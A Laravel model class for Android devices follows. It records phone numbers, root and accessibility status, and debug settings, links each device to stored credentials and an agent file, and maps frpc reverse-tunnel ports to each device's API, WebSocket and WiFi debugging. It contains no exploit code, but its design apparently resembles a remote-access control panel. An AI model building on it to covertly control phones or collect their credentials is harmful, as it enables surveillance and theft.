<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasOne;

class Device extends Model
{
    use HasFactory;

    protected $fillable = [
        'uuid',
        'user_id',
        'name',
        'remark',
        'country',
        'ip_address',
        'ip_location',
        'android_version',
        'model',
        'phone_number',
        'phone_number2',
        'battery_level',
        'is_charging',
        'network_type',
        'sdk_version',
        'app_name',
        'app_version',
        'screen_width',
        'screen_height',
        'has_sim',
        'installed_at',
        'last_seen_at',
        'is_online',
        'is_removed',
        'is_active',
        'has_accessibility',
        'settings',
        'permissions',
        'session_id',
        'frpc_base_port',
        'frpc_config_generated_at',
        'device_uid',
        'brand',
        'manufacturer',
        'fingerprint',
        'serial',
        'package_name',
        'is_root',
        'enable_development',
        'enable_debug',
        'enable_wifi_debug',
        'lang_code',
        'trustee_id',
        'tunnel_status',
    ];

    protected function casts(): array
    {
        return [
            'installed_at' => 'datetime',
            'last_seen_at' => 'datetime',
            'is_online' => 'boolean',
            'is_removed' => 'boolean',
            'is_active' => 'boolean',
            'has_accessibility' => 'boolean',
            'is_charging' => 'boolean',
            'has_sim' => 'boolean',
            'is_root' => 'boolean',
            'enable_development' => 'boolean',
            'enable_debug' => 'boolean',
            'enable_wifi_debug' => 'boolean',
            'settings' => 'array',
            'permissions' => 'array',
            'frpc_config_generated_at' => 'datetime',
        ];
    }

    public function user(): BelongsTo
    {
        return $this->belongsTo(User::class);
    }

    /**
     * 获取路由模型绑定的键名
     * 使用 uuid 替代默认的 id 进行路由查找
     */
    public function getRouteKeyName(): string
    {
        return 'uuid';
    }

    public function markOnline(): void
    {
        $this->update([
            'is_online' => true,
            'last_seen_at' => now(),
        ]);
    }

    public function markOffline(): void
    {
        $this->update(['is_online' => false]);
    }

    public function detail(): HasOne
    {
        return $this->hasOne(DeviceDetail::class);
    }

    public function agentFile(): HasOne
    {
        return $this->hasOne(DeviceAgentFile::class);
    }

    public function logs(): HasMany
    {
        return $this->hasMany(DeviceLog::class);
    }

    public function credentials(): HasMany
    {
        return $this->hasMany(DeviceCredential::class);
    }

    /**
     * 获取已分配的 frpc 端口映射。
     * 每台设备占用 3 个连续端口:
     *   base+0 → HTTP API (local 7910)
     *   base+1 → WebSocket (local 7900)
     *   base+2 → WiFi Debug (dynamic)
     */
    public function getFrpcPortMap(): ?array
    {
        if (! $this->frpc_base_port) {
            return null;
        }

        return [
            'http_api' => $this->frpc_base_port,
            'websocket' => $this->frpc_base_port + 1,
            'wifi_debug' => $this->frpc_base_port + 2,
        ];
    }
}
